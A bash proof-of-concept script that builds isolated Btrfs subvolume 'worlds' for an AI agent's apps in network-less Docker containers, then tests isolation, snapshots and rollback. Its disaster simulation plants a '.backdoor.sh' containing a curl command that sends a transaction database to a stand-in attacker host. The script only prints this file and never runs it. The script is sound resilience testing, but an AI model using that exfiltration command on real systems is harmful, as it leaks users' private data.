#!/bin/bash
set -e

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
BOLD='\033[1m'
NC='\033[0m'

pass() { echo -e "${GREEN}✓ PASS: $1${NC}"; }
fail() { echo -e "${RED}✗ FAIL: $1${NC}"; exit 1; }
header() { echo -e "\n${CYAN}${BOLD}════════════════════════════════════════════${NC}"; echo -e "${CYAN}${BOLD}  $1${NC}"; echo -e "${CYAN}${BOLD}════════════════════════════════════════════${NC}\n"; }
step() { echo -e "${YELLOW}→ $1${NC}"; }

# ──────────────────────────────────────────────
# Phase 1: Create the User Image
# ──────────────────────────────────────────────
header "Phase 1: Create the User Image"

step "Creating image directory..."
mkdir -p /data/images

step "Creating 2GB sparse image file..."
truncate -s 2G /data/images/alice.img

step "Actual disk usage (should be ~0 bytes, proving sparseness):"
du -h /data/images/alice.img

step "Apparent size (should be 2GB):"
du -h --apparent-size /data/images/alice.img

step "Formatting with Btrfs..."
mkfs.btrfs -f /data/images/alice.img

step "Mounting via loop device..."
mkdir -p /mnt/users/alice
mount -o loop /data/images/alice.img /mnt/users/alice

step "Verifying mount:"
mount | grep alice
pass "User image created and mounted"

# ──────────────────────────────────────────────
# Phase 2: Create Subvolumes (Worlds)
# ──────────────────────────────────────────────
header "Phase 2: Create Subvolumes (Worlds)"

step "Creating subvolumes..."
btrfs subvolume create /mnt/users/alice/core
btrfs subvolume create /mnt/users/alice/app-email
btrfs subvolume create /mnt/users/alice/app-budget

step "Creating snapshots directory..."
mkdir -p /mnt/users/alice/snapshots

step "Listing subvolumes:"
btrfs subvolume list /mnt/users/alice

step "Seeding core world..."
cat > /mnt/users/alice/core/config.json <<'EOF'
{"agent_name": "alice-agent", "version": "1.0"}
EOF
mkdir -p /mnt/users/alice/core/memory
cat > /mnt/users/alice/core/memory/MEMORY.md <<'EOF'
# Agent Memory

## Key Facts
- User prefers concise responses
- Timezone: US/Pacific
- Last task: organized inbox on 2026-02-25

## Learned Patterns
- Budget reports are due on Fridays
- Email summaries preferred in bullet format
EOF

step "Seeding email world..."
mkdir -p /mnt/users/alice/app-email/data
cat > /mnt/users/alice/app-email/data/inbox.db <<'EOF'
id|from|subject|date|read
1|bob@example.com|Q4 Report|2026-02-20|true
2|carol@example.com|Lunch tomorrow?|2026-02-24|false
3|dave@example.com|Budget review meeting|2026-02-25|false
EOF
cat > /mnt/users/alice/app-email/config.json <<'EOF'
{"domain": "alice.example.com", "smtp_port": 587}
EOF

step "Seeding budget world..."
mkdir -p /mnt/users/alice/app-budget/data
cat > /mnt/users/alice/app-budget/data/transactions.db <<'EOF'
id|date|description|amount|category
1|2026-02-01|Grocery Store|−85.50|food
2|2026-02-03|Electric Bill|−142.00|utilities
3|2026-02-05|Salary Deposit|+4200.00|income
4|2026-02-10|Coffee Shop|−6.75|food
EOF
mkdir -p /mnt/users/alice/app-budget/src
cat > /mnt/users/alice/app-budget/src/app.py <<'PYEOF'
"""Budget tracking application."""
import json
from pathlib import Path

DATA_DIR = Path("/workspace/data")

def load_transactions():
    with open(DATA_DIR / "transactions.db") as f:
        return [line.strip().split("|") for line in f.readlines()[1:]]

def summary():
    txns = load_transactions()
    total = sum(float(t[3]) for t in txns)
    return {"transaction_count": len(txns), "balance": total}

if __name__ == "__main__":
    print(json.dumps(summary(), indent=2))
PYEOF

pass "All worlds seeded with initial content"

# ──────────────────────────────────────────────
# Phase 3: Start Isolated Containers
# ──────────────────────────────────────────────
header "Phase 3: Start Isolated Containers"

step "Pulling Alpine image..."
docker pull alpine:3.19

step "Starting alice-core container..."
docker run -d \
    --name alice-core \
    --network none \
    --read-only \
    --tmpfs /tmp \
    -v /mnt/users/alice/core:/workspace \
    alpine:3.19 tail -f /dev/null

step "Starting alice-app-email container..."
docker run -d \
    --name alice-app-email \
    --network none \
    --read-only \
    --tmpfs /tmp \
    -v /mnt/users/alice/app-email:/workspace \
    alpine:3.19 tail -f /dev/null

step "Starting alice-app-budget container..."
docker run -d \
    --name alice-app-budget \
    --network none \
    --read-only \
    --tmpfs /tmp \
    -v /mnt/users/alice/app-budget:/workspace \
    alpine:3.19 tail -f /dev/null

step "Verifying all containers are running:"
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Image}}"
pass "All 3 containers running with isolated mounts"

# ──────────────────────────────────────────────
# Phase 4: Prove Isolation
# ──────────────────────────────────────────────
header "Phase 4: Prove Isolation"

# --- app-budget isolation ---
step "Testing alice-app-budget isolation..."

echo "  Files visible in /workspace:"
docker exec alice-app-budget ls /workspace/
docker exec alice-app-budget ls /workspace/src/app.py && echo "  app.py exists ✓"

echo "  Checking for escape paths..."
# /mnt should not exist or be empty
if docker exec alice-app-budget ls /mnt/users/ 2>/dev/null | grep -q .; then
    fail "app-budget can see /mnt/users/ — isolation broken!"
fi
# /data should not exist
if docker exec alice-app-budget ls /data/ 2>/dev/null | grep -q .; then
    fail "app-budget can see /data/ — isolation broken!"
fi
# Verify no other world paths are accessible as mount points
if docker exec alice-app-budget ls /mnt/users/alice/app-email 2>/dev/null | grep -q .; then
    fail "app-budget can access app-email mount path — isolation broken!"
fi
if docker exec alice-app-budget ls /mnt/users/alice/core 2>/dev/null | grep -q .; then
    fail "app-budget can access core mount path — isolation broken!"
fi
pass "app-budget can only see its own world"

# --- app-email isolation ---
step "Testing alice-app-email isolation..."

echo "  Files visible in /workspace:"
docker exec alice-app-email ls /workspace/

echo "  Checking for budget world leakage..."
if docker exec alice-app-email find /workspace -name "transactions*" -o -name "app.py" 2>/dev/null | grep -q .; then
    fail "app-email can see budget files — isolation broken!"
fi
pass "app-email can only see its own world"

# --- core isolation ---
step "Testing alice-core isolation..."

echo "  Files visible in /workspace:"
docker exec alice-core ls /workspace/

echo "  Checking for other world leakage..."
if docker exec alice-core find /workspace -name "inbox*" -o -name "transactions*" 2>/dev/null | grep -q .; then
    fail "core can see other worlds' files — isolation broken!"
fi
pass "core can only see its own world"

# ──────────────────────────────────────────────
# Phase 5: Simulate Agent Work + Snapshot
# ──────────────────────────────────────────────
header "Phase 5: Simulate Agent Work + Snapshot"

step "Agent writing new files in budget world..."

docker exec alice-app-budget sh -c 'cat > /workspace/src/custom_feature.py << "PYEOF"
"""Custom analytics feature added by agent."""

def spending_by_category(transactions):
    categories = {}
    for txn in transactions:
        cat = txn[4]
        amount = float(txn[3])
        categories[cat] = categories.get(cat, 0) + amount
    return categories

def monthly_trend(transactions):
    return {"february": len(transactions), "trend": "stable"}
PYEOF'

docker exec alice-app-budget sh -c 'echo "5|2026-02-15|Online Subscription|−12.99|entertainment" >> /workspace/data/transactions.db'

docker exec alice-app-budget sh -c 'cat > /workspace/src/dashboard.html << "HTMLEOF"
<!DOCTYPE html>
<html>
<head><title>Budget Dashboard</title></head>
<body>
  <h1>Alice Budget Dashboard</h1>
  <div id="summary"></div>
  <div id="chart"></div>
  <script>fetch("/api/summary").then(r => r.json()).then(renderDashboard);</script>
</body>
</html>
HTMLEOF'

step "Current state of budget world:"
docker exec alice-app-budget find /workspace -type f | sort

step "Taking snapshot of budget world..."
btrfs subvolume snapshot -r /mnt/users/alice/app-budget /mnt/users/alice/snapshots/app-budget-checkpoint-1

step "Listing snapshots:"
btrfs subvolume list -s /mnt/users/alice

step "Snapshot disk usage (COW — near-zero additional space):"
echo "  Snapshot:"
btrfs filesystem du -s /mnt/users/alice/snapshots/app-budget-checkpoint-1
echo "  Live subvolume:"
btrfs filesystem du -s /mnt/users/alice/app-budget

pass "Snapshot taken — instant, near-zero additional disk space"

# ──────────────────────────────────────────────
# Phase 6: Simulate Disaster + Rollback
# ──────────────────────────────────────────────
header "Phase 6: Simulate Disaster + Rollback"

step "Simulating catastrophic failure in budget world..."

docker exec alice-app-budget sh -c 'rm /workspace/src/app.py'
docker exec alice-app-budget sh -c 'echo "CORRUPTED GARBAGE DATA @@##!!%%" > /workspace/data/transactions.db'
docker exec alice-app-budget sh -c 'cat > /workspace/src/.backdoor.sh << "EOF"
#!/bin/sh
# Malicious script planted by attacker
curl -s http://evil.example.com/exfil -d @/workspace/data/transactions.db
EOF'

step "Current (broken) state:"
docker exec alice-app-budget find /workspace -type f | sort
echo ""
echo "  Corrupted transactions.db:"
docker exec alice-app-budget cat /workspace/data/transactions.db
echo ""
echo "  Backdoor exists:"
docker exec alice-app-budget cat /workspace/src/.backdoor.sh

echo -e "\n${RED}${BOLD}  ⚠ DISASTER: app-budget has been compromised/corrupted${NC}\n"

step "Rolling back..."

echo "  Stopping compromised container..."
docker stop alice-app-budget && docker rm alice-app-budget

echo "  Deleting corrupted subvolume..."
btrfs subvolume delete /mnt/users/alice/app-budget

echo "  Restoring from snapshot..."
btrfs subvolume snapshot /mnt/users/alice/snapshots/app-budget-checkpoint-1 /mnt/users/alice/app-budget

echo "  Restarting container with restored world..."
docker run -d \
    --name alice-app-budget \
    --network none \
    --read-only \
    --tmpfs /tmp \
    -v /mnt/users/alice/app-budget:/workspace \
    alpine:3.19 tail -f /dev/null

step "Verifying restored state..."

# app.py should be back
if docker exec alice-app-budget ls /workspace/src/app.py &>/dev/null; then
    echo "  ✓ src/app.py is back"
else
    fail "src/app.py not restored!"
fi

# transactions.db should have correct data including agent additions
if docker exec alice-app-budget cat /workspace/data/transactions.db | grep -q "Online Subscription"; then
    echo "  ✓ transactions.db has correct data (including agent additions)"
else
    fail "transactions.db not properly restored!"
fi

# backdoor should NOT exist
if docker exec alice-app-budget ls /workspace/src/.backdoor.sh &>/dev/null; then
    fail ".backdoor.sh still exists — rollback incomplete!"
else
    echo "  ✓ .backdoor.sh does not exist (removed by rollback)"
fi

# custom_feature.py should exist (was in snapshot)
if docker exec alice-app-budget ls /workspace/src/custom_feature.py &>/dev/null; then
    echo "  ✓ custom_feature.py exists (preserved from snapshot)"
else
    fail "custom_feature.py missing — snapshot was incomplete!"
fi

# dashboard.html should exist (was in snapshot)
if docker exec alice-app-budget ls /workspace/src/dashboard.html &>/dev/null; then
    echo "  ✓ dashboard.html exists (preserved from snapshot)"
else
    fail "dashboard.html missing — snapshot was incomplete!"
fi

pass "Rollback successful, budget world restored to checkpoint-1"

# ──────────────────────────────────────────────
# Phase 7: Prove Other Worlds Were Unaffected
# ──────────────────────────────────────────────
header "Phase 7: Prove Other Worlds Were Unaffected"

step "Checking email world..."
docker exec alice-app-email cat /workspace/data/inbox.db | grep -q "Q4 Report" || fail "Email inbox.db corrupted!"
docker exec alice-app-email cat /workspace/config.json | grep -q "alice.example.com" || fail "Email config.json corrupted!"
pass "Email world was completely unaffected by budget disaster + rollback"

step "Checking core world..."
docker exec alice-core cat /workspace/config.json | grep -q "alice-agent" || fail "Core config.json corrupted!"
docker exec alice-core cat /workspace/memory/MEMORY.md | grep -q "Budget reports" || fail "Core MEMORY.md corrupted!"
pass "Core world was completely unaffected by budget disaster + rollback"

# ──────────────────────────────────────────────
# Phase 8: Show Disk Efficiency
# ──────────────────────────────────────────────
header "Phase 8: Show Disk Efficiency"

step "Btrfs filesystem usage:"
btrfs filesystem usage /mnt/users/alice

step "Per-subvolume space usage:"
btrfs filesystem du -s /mnt/users/alice/core
btrfs filesystem du -s /mnt/users/alice/app-email
btrfs filesystem du -s /mnt/users/alice/app-budget
btrfs filesystem du -s /mnt/users/alice/snapshots/app-budget-checkpoint-1

step "Sparse image actual vs apparent size:"
ACTUAL=$(du -h /data/images/alice.img | awk '{print $1}')
APPARENT=$(du -h --apparent-size /data/images/alice.img | awk '{print $1}')
echo "  Actual disk usage:  ${ACTUAL}"
echo "  Apparent size:      ${APPARENT}"

# ──────────────────────────────────────────────
# Final Summary
# ──────────────────────────────────────────────
echo ""
echo -e "${GREEN}${BOLD}════════════════════════════════════════════${NC}"
echo -e "${GREEN}${BOLD}  PROOF OF CONCEPT: COMPLETE${NC}"
echo -e "${GREEN}${BOLD}════════════════════════════════════════════${NC}"
echo -e "${GREEN}  ✓ Sparse image file created (2GB apparent, ${ACTUAL} actual)${NC}"
echo -e "${GREEN}  ✓ Btrfs formatted and mounted${NC}"
echo -e "${GREEN}  ✓ 3 isolated worlds created as subvolumes${NC}"
echo -e "${GREEN}  ✓ 3 Docker containers, each seeing only its own world${NC}"
echo -e "${GREEN}  ✓ World isolation verified (no cross-world access)${NC}"
echo -e "${GREEN}  ✓ Agent work simulated (files written from container)${NC}"
echo -e "${GREEN}  ✓ Snapshot taken (instant, near-zero space)${NC}"
echo -e "${GREEN}  ✓ Disaster simulated (files corrupted/deleted)${NC}"
echo -e "${GREEN}  ✓ Rollback executed (instant restore from snapshot)${NC}"
echo -e "${GREEN}  ✓ Restored world verified (all good data back, bad data gone)${NC}"
echo -e "${GREEN}  ✓ Other worlds unaffected (isolation held during rollback)${NC}"
echo -e "${GREEN}  ✓ Disk efficiency confirmed (sparse + COW working)${NC}"
echo -e "${GREEN}${BOLD}════════════════════════════════════════════${NC}"
